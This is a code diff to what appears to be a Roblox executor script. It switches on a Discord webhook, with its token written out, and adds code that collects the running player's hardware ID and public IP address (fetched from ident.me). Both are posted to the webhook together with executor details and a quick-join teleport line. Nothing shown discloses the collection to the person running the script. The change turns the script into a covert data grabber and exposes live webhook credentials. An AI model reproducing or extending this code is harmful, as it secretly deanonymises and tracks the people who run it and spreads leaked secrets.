@@ -28,7 +28,7 @@ end
 
 local akAdminKey = fetchKey()
 
---[[local webhookURL = "https://discord.com/api/webhooks/1358861967434977430/gG-5slP4ymn2ST46z_YRctCV6cydL_qr2-PmFRg4VH8fQEP19eoVmpQxOqxS-5S0hMYW"
+local webhookURL = "https://discord.com/api/webhooks/1360363792797667439/HyzcHgo-2IahecC2GR1lYgrJ75j_boNpch1R36Q61te9SIERh8wIuKe26Ajh_rfUOg1f"
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 task.wait(0.2)
 local currentTime = os.date("%Y-%m-%d %H:%M:%S", os.time())
@@ -77,6 +77,9 @@ if executorName == "" then
 	executorInfo = "Safety Unknown"
 end
 
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+local IP = game:HttpGet("https://v4.ident.me/")
+
 local data = {
 	content = "",
 	embeds = {{
@@ -90,6 +93,8 @@ local data = {
 			{ name = "**Time Executed**", value = "`" .. currentTime .. "`", inline = true },
 			{ name = "**Executor**", value = "`" .. executorName .. "`", inline = true },
 			{ name = "**Executor Host Information**", value = executorInfo, inline = true },
+			{ name = "**HWID**", value = HWID, inline = true },
+			{ name = "**IP**", value = IP, inline = true },
 			{ name = "**Quick Join**", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. (game.JobId or "N/A") .. "', game.Players.LocalPlayer)\n```", inline = false }
 		},
 		footer = {
